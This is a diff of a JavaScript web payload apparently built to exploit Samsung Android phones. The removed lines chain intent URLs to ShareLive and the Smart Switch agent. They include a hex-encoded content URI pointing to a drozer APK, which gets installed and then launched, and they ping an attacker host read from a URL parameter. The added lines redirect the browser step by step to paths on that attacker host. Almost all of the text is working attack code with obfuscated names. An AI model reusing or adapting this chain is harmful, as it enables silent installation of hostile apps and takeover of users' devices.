@@ -3,26 +3,20 @@ var yayquerystringyay = window.location.search;
 var yayurlparamsyay = new URLSearchParams(yayquerystringyay); 
 var yayattackeryay = yayurlparamsyay.get('yayattackeryay'); 
 
-fetch("http://" + yayattackeryay + "/ping");
-    
-setTimeout(function(){
-    location.href="intent://#Intent;component=com.samsung.android.app.sharelive/.presentation.main.MainActivity;end;";
-}, 500);
-
+location.href="http://" + yayattackeryay + "/yaylaunchshareliveyay"; 
 const yayshorttimeoutyay = setTimeout(yayshareliveyay, 4000); 
 
 function yayshareliveyay() { 
-    location.href="intent://qr.quickshare.samsungcloud.com/88AKqZwy2Hmr#Intent;component=com.samsung.android.app.sharelive/com.samsung.android.app.sharelive.presentation.applink.QrCodeAppLinkActivity;scheme=https;end;";
+        location.href="http://" + yayattackeryay + "/yayshareliveyay"; 
 } 
-
 const yaytimeoutyay = setTimeout(yaydownloadyay, 15000); 
 
 function yaydownloadyay() { 
-    location.href="intent://#Intent;component=com.sec.android.easyMover.Agent/.ui.SsmUpdateCheckActivity;action=com.sec.android.easyMover.Agent.WATCH_INSTALL_SMART_SWITCH;S.MODE=DIALOG;S.ssm_action=yayactionyay;S.ssm_uri=%63%6f%6e%74%65%6e%74%3a%2f%2f%63%6f%6d%2e%73%61%6d%73%75%6e%67%2e%67%70%75%77%61%74%63%68%61%70%70%2e%48%74%6d%6c%44%75%6d%70%50%72%6f%76%69%64%65%72%2f%64%72%6f%7a%65%72%2e%61%70%6b;end;";
+        location.href="http://" + yayattackeryay + "/yaydownloadyay"; 
+        const yaytimeout1yay = setTimeout(yaylaunchyay, 8000); 
+} 
+function yaylaunchyay() { 
+        location.href="http://" + yayattackeryay + "/yaylaunchyay"; 
 } 
 
-setTimeout(yaylaunchyay, 23000); 
-function yaylaunchyay() { 
-    location.href="intent://#Intent;component=com.withsecure.dz/com.WithSecure.dz.activities.MainActivity;end";
-} 
-</script>
+</script> 
